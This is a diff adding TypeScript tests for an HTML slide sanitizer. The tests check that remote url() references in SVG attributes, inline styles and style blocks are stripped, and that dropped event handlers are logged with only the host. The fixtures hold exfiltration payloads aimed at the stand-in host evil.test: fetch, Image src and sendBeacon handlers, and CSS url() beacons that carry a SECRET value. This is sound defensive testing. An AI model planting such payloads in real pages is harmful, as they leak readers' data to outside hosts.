@@ -156,3 +156,85 @@ test('read path: sanitizeDeckSlideHtml cleans a stored legacy slide without a re
   assert.match(out, /<p>keep<\/p>/)
   assert.equal(sanitizeDeckSlideHtml(out), out)
 })
+
+// QA r1: SVG cursor is a fetching presentation attribute, outside CSS_URL_ATTRS.
+test('strips URL-bearing SVG cursor presentation attributes', () => {
+  const out = one('<section><svg><path cursor="url(https://evil.test/cursor.png?d=SECRET), auto" d="M0 0"></path></svg></section>')
+  assert.doesNotMatch(out, /evil\.test|SECRET/, out)
+})
+
+// QA r1: handlers are dropped but their attempted remote hosts are not logged.
+test('logs host-only egress when dropping a URL-bearing handler', async () => {
+  const lines: string[] = []
+  const { logger } = await import('./log.ts')
+  const orig = logger.warn
+  logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
+  try {
+    one(`<section><img src="${PNG}" onerror="fetch('https://evil.test/p.png?SECRET')"></section>`)
+  } finally {
+    logger.warn = orig
+  }
+  const all = lines.join('\n')
+  assert.match(all, /"hosts":\["evil\.test"\]/)
+  assert.doesNotMatch(all, /SECRET|p\.png/)
+})
+
+// QA r2 scope: ANY remote url() in ANY attribute value or CSS property is stripped, not just a list of names.
+const REMOTE = 'url(https://evil.test/a.png?d=SECRET)'
+const URL_PLACES: Array<[string, string]> = [
+  ['svg fill', `<svg><rect fill="${REMOTE}"/></svg>`],
+  ['svg stroke', `<svg><rect stroke="${REMOTE}"/></svg>`],
+  ['svg marker-start', `<svg><path marker-start="${REMOTE}" d="M0 0"/></svg>`],
+  ['svg marker-mid', `<svg><path marker-mid="${REMOTE}" d="M0 0"/></svg>`],
+  ['svg marker-end', `<svg><path marker-end="${REMOTE}" d="M0 0"/></svg>`],
+  ['svg mask attr', `<svg><rect mask="${REMOTE}"/></svg>`],
+  ['svg clip-path attr', `<svg><rect clip-path="${REMOTE}"/></svg>`],
+  ['svg filter attr', `<svg><rect filter="${REMOTE}"/></svg>`],
+  ['svg cursor attr, fallback list', `<svg><rect cursor="${REMOTE}, auto"/></svg>`],
+  ['svg shape-inside attr', `<svg><text shape-inside="${REMOTE}">a</text></svg>`],
+  ['an unknown attribute', `<div data-bg="${REMOTE}" foo="${REMOTE}">x</div>`],
+  ['style cursor', `<div style="cursor:${REMOTE}, pointer">x</div>`],
+  ['style list-style-image', `<ul style="list-style-image:${REMOTE}"><li>x</li></ul>`],
+  ['style border-image', `<div style="border-image:${REMOTE} 30 round">x</div>`],
+  ['style border-image-source', `<div style="border-image-source:${REMOTE}">x</div>`],
+  ['style mask-image', `<div style="mask-image:${REMOTE};-webkit-mask-image:${REMOTE}">x</div>`],
+  ['style content', `<div style="content:${REMOTE}">x</div>`],
+  ['style filter url', `<div style="filter:${REMOTE}">x</div>`],
+  ['style background shorthand', `<div style="background:#fff ${REMOTE} no-repeat">x</div>`],
+  ['style custom property', `<div style="--bg:${REMOTE};background:var(--bg)">x</div>`],
+  ['style block cursor', `<style>.a{cursor:${REMOTE},auto}</style><p class="a">x</p>`],
+  ['style block @font-face src', `<style>@font-face{font-family:f;src:${REMOTE}}</style><p>x</p>`],
+  ['style in svg', `<svg><style>.a{fill:${REMOTE}}</style></svg>`],
+]
+for (const [name, frag] of URL_PLACES) {
+  test(`remote url() stripped: ${name}`, () => {
+    const out = one(`<section>${frag}</section>`)
+    assert.doesNotMatch(out, /evil\.test|SECRET/, out)
+    assert.equal(one(out), out, 'idempotent')
+  })
+}
+
+test('local url() is kept in any attribute or property', () => {
+  const out = one(`<section><svg><rect fill="url(#g)" cursor="url(${PNG}), auto"/></svg><div style="cursor:url(${PNG}),auto;mask-image:url(#m)">x</div></section>`)
+  assert.match(out, /fill="url\(#g\)"/)
+  assert.match(out, /cursor="url\(data:image\/png/)
+  assert.match(out, /mask-image:url\(#m\)/)
+})
+
+test('a handler that names a host is logged host-only, in several shapes', async () => {
+  const { logger } = await import('./log.ts')
+  const orig = logger.warn
+  for (const h of ["fetch('https://a.evil.test/p?SECRET')", 'new Image().src="//b.evil.test/x?SECRET"', "navigator.sendBeacon('http://c.evil.test:8080/q?SECRET')"]) {
+    const lines: string[] = []
+    logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
+    try {
+      one(`<section><p onclick="${h.replace(/"/g, '&quot;')}">x</p></section>`)
+    } finally {
+      logger.warn = orig
+    }
+    const all = lines.join('\n')
+    assert.match(all, /"kind":"handler"/, h)
+    assert.match(all, /evil\.test/, h)
+    assert.doesNotMatch(all, /SECRET|\/p\b|\/q\b/, h)
+  }
+})
